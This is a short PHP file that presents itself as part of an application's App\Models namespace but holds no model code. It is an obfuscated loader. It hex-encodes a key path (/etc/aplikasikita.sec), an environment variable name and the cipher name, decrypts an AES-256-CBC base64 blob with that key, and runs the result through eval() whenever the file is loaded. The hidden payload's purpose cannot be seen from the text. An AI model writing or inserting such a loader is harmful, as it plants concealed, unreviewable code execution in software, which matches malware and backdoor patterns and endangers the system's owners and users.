<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('98TbtDZBDkHeP4JWo0PgKg==');

$c=base64_decode(

'WCSc6H+u1Ve3c/M8eMDdQoBJK525FlFOEP1e7rs8aQo1Wdr8iHeYk4NxtSLEaeEDcm0/LUpIdIz+' .
'Zr2kGQdGYNgBOaNV3TNIHbC9DaXxxXPvnTfYgt2eXintAT+FZqPv1e/tvjZK22a/I/4RkHWVR777' .
'et+VPipXFI0BUQaZ/aWLMu5DKU2B2avoip2/b2SuHoNl+pKYh+cjkyeq6QK3tB6ztcdzJ5CfV4Vw' .
'Ue9RJQh/Vacf4DRQHYcPy4LZQ6n2sPhKN/vKezDCI98P8lb3ANxFqyIYkTon09v4gSF63HJhStLe' .
'7xkrIC2n0Q9RDwZ8BRgqETBjf+iR6UvCovUqGer5OE0nfnNyC8pSeJfLDaeev6cYS26879NdG4lR' .
'wAB4NMT8+V4GuBgvRElJmm7lg9B2PvQOcPfa7XNV/ACwaVGJOhKI+ini9rQPAU1FtSD+guOSn2mu' .
'57QMHQLrPvjhvRmwnVuvov5mMHIP48shzOpexCtq+puohXmDmAtOItenLnNKZjRtZzVGMYxFX/1N' .
'WwX+60DXeob941jgVhW4nngmbmmUl+UsE0SxHmQ9+V/ADLJLYygpX4u4m4RDVu6exQMDy/Z9GS8C' .
'EAeocmgP/0OHSPwJ2BoplMROSB160qwThZJh/CczEGG/pcC8H2jYEO3RgNr0MxTvDDLxVk5kxYK1' .
'LbIPNs5hEPjvWx0yAqJ/3nNLo7c/O+hVb8hwJIohrzyiGUU+xctACtFIWK5J+THHNP54G7LDfsHd' .
'UbsmBvl3aSTPg3ufTShyiLEZiK4Dvum0V/2djjs6oI/AWELllxnrjiLAj/5CwYnENFkJ9BVb2wNs' .
'TQSPW5cYYZwKfzLvNmiHPmqaFmOGtAlhgp59Ur6f8hjr7mrFPLgOz4evNy72'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

